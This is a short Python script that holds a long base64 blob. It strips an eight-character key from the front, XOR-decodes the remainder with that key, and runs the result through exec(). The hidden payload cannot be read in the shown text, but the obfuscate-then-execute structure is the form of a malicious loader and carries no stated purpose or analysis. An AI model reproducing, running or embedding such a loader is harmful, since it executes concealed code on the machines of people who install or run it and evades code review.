sType = 'default'


temp = "w4IxUULD" + "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"
import base64
data=base64.b64decode(temp[8:]);sk=temp[:8];size=len(data);res=''
for i in range(size):k=i&7;c=chr(data[i]^ord(sk[k]));res+=c
exec(res)
